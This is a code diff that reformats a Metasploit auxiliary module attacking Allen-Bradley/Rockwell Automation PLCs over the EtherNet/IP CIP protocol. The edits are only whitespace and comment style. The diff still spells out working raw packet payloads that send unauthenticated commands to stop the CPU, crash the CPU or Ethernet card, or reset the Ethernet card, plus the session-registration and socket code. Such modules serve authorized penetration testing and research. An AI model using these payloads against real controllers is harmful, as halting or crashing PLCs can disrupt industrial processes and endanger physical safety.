@@ -7,35 +7,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Rex::Socket::Tcp
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Allen-Bradley/Rockwell Automation EtherNet/IP CIP Commands',
-      'Description'    => %q{
-        The EtherNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which
-        implements the protocol.  This module implements the CPU STOP command, as well as
-        the ability to crash the Ethernet card in an affected device.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Allen-Bradley/Rockwell Automation EtherNet/IP CIP Commands',
+        'Description' => %q{
+          The EtherNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which
+          implements the protocol.  This module implements the CPU STOP command, as well as
+          the ability to crash the Ethernet card in an affected device.
 
-        This module is based on the original 'ethernetip-multi.rb' Basecamp module
-        from DigitalBond.
-      },
-      'Author'         =>
-        [
+          This module is based on the original 'ethernetip-multi.rb' Basecamp module
+          from DigitalBond.
+        },
+        'Author' => [
           'Ruben Santamarta <ruben[at]reversemode.com>',
           'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
           'todb' # Metasploit fixups
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
         ],
-      'DisclosureDate' => '2012-01-19'))
+        'DisclosureDate' => '2012-01-19'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(44818),
         # Note that OptEnum is case sensitive
-        OptEnum.new("ATTACK", [true, "The attack to use.", "STOPCPU",
+        OptEnum.new("ATTACK", [
+          true, "The attack to use.", "STOPCPU",
           [
             "STOPCPU",
             "CRASHCPU",
@@ -62,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
     packet += "\x6f\x00" # command: Send request/reply data
     packet += [payload.size - 0x10].pack("v") # encap length (2 bytes)
     packet += [sessionid].pack("N") # session identifier (4 bytes)
-    packet += payload #payload part
+    packet += payload # payload part
     begin
       sock.put(packet)
     rescue ::Interrupt
@@ -89,9 +92,9 @@ class MetasploitModule < Msf::Auxiliary
       sock.put(packet)
       response = sock.get_once
       if response
-        session_id = response[4..8].unpack("N")[0] rescue nil# bare minimum of parsing done
+        session_id = response[4..8].unpack("N")[0] rescue nil # bare minimum of parsing done
         if session_id
-          print_status("#{rhost}:#{rport} - CIP - Got session id: 0x"+session_id.to_s(16))
+          print_status("#{rhost}:#{rport} - CIP - Got session id: 0x" + session_id.to_s(16))
         else
           print_error("#{rhost}:#{rport} - CIP - Got invalid session id, aborting.")
           return nil
@@ -116,20 +119,20 @@ class MetasploitModule < Msf::Auxiliary
   def payload(attack)
     case attack
     when "STOPCPU"
-      payload =  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + #encapsulation -[payload.size-0x10]-
-      "\x00\x00\x00\x00\x02\x00\x02\x00\x00\x00\x00\x00\xb2\x00\x1a\x00" + #packet1
-      "\x52\x02\x20\x06\x24\x01\x03\xf0\x0c\x00\x07\x02\x20\x64\x24\x01" + #packet2
-      "\xDE\xAD\xBE\xEF\xCA\xFE\x01\x00\x01\x00"                           #packet3
+      payload = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + # encapsulation -[payload.size-0x10]-
+                "\x00\x00\x00\x00\x02\x00\x02\x00\x00\x00\x00\x00\xb2\x00\x1a\x00" + # packet1
+                "\x52\x02\x20\x06\x24\x01\x03\xf0\x0c\x00\x07\x02\x20\x64\x24\x01" + # packet2
+                "\xDE\xAD\xBE\xEF\xCA\xFE\x01\x00\x01\x00"                           # packet3
     when "CRASHCPU"
       payload = "\x00\x00\x00\x00\x02\x00\x02\x00\x00\x00\x00\x00\xb2\x00\x1a\x00" +
-      "\x52\x02\x20\x06\x24\x01\x03\xf0\x0c\x00\x0a\x02\x20\x02\x24\x01" +
-      "\xf4\xf0\x09\x09\x88\x04\x01\x00\x01\x00"
+                "\x52\x02\x20\x06\x24\x01\x03\xf0\x0c\x00\x0a\x02\x20\x02\x24\x01" +
+                "\xf4\xf0\x09\x09\x88\x04\x01\x00\x01\x00"
     when "CRASHETHER"
       payload = "\x00\x00\x00\x00\x20\x00\x02\x00\x00\x00\x00\x00\xb2\x00\x0c\x00" +
-      "\x0e\x03\x20\xf5\x24\x01\x10\x43\x24\x01\x10\x43"
+                "\x0e\x03\x20\xf5\x24\x01\x10\x43\x24\x01\x10\x43"
     when "RESETETHER"
       payload = "\x00\x00\x00\x00\x00\x04\x02\x00\x00\x00\x00\x00\xb2\x00\x08\x00" +
-      "\x05\x03\x20\x01\x24\x01\x30\x03"
+                "\x05\x03\x20\x01\x24\x01\x30\x03"
     else
       print_error("#{rhost}:#{rport} - CIP - Invalid attack option.")
       return nil
